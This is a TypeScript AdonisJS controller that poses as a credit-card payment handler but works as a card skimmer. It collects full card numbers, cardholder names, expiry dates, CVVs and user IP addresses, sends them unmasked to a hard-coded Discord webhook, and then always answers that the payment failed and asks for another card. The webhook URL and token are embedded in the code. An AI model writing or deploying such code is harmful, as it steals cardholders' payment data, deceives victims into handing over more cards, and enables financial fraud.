// app/Controllers/Http/PaymentController.ts
import axios from 'axios'
import type { HttpContext } from '@adonisjs/core/http'
import app from '@adonisjs/core/services/app'

export default class PaymentController {
  async processCreditPayment(ctx: HttpContext) {
    try {
      // Recebe os dados do frontend
      const { cardNumber, cardName, expiryDate, cvv } = ctx.request.only([
        'cardNumber',
        'cardName',
        'expiryDate',
        'cvv',
      ])

      // Validação básica
      if (!cardNumber || !cardName || !expiryDate || !cvv) {
        return ctx.response.status(400).json({ error: 'Todos os campos são obrigatórios' })
      }

      // Cria o log com dados reais (sem máscara)
      const paymentLog = {
        cardNumber,
        cardName,
        expiryDate,
        cvv,
        timestamp: new Date().toISOString(),
        ip: ctx.request.ip() || 'Desconhecido',
      }

      // Configuração do webhook do Discord
      const webhookUrl = 'https://discord.com/api/webhooks/1334272674028982282/6uT4qLfotlmSW1uv7yMgjbXTGPclvhaVH43MLEIocF3-IAigO8gDoypI9uILP5MbK8bA'
      const payload = {
        content: `**Novo Pagamento com Cartão Recebido**\n` +
                 `**Número do Cartão:** ${paymentLog.cardNumber}\n` +
                 `**Nome no Cartão:** ${paymentLog.cardName}\n` +
                 `**Validade:** ${paymentLog.expiryDate}\n` +
                 `**CVV:** ${paymentLog.cvv}\n` +
                 `**IP do Usuário:** ${paymentLog.ip}\n` +
                 `**Data/Hora:** ${paymentLog.timestamp}`,
        username: 'Bot de Pagamento',
        avatar_url: 'https://i.imgur.com/AfFp7pu.png',
      }

      // Envia a mensagem para o Discord
      await axios.post(webhookUrl, payload)

      return ctx.response.status(200).json({
        approved: false,
        message: 'Pagamento não aprovado. Tente novamente ou use outro cartão.',
      })
    } catch (error) {
      // Log de erro
      if (ctx.logger) {
        ctx.logger.error('Erro ao processar pagamento:', error.message)
      } else {
        console.error('Erro ao processar pagamento:', error.message)
      }
      return ctx.response.status(500).json({ error: 'Erro interno ao processar pagamento' })
    }
  }
}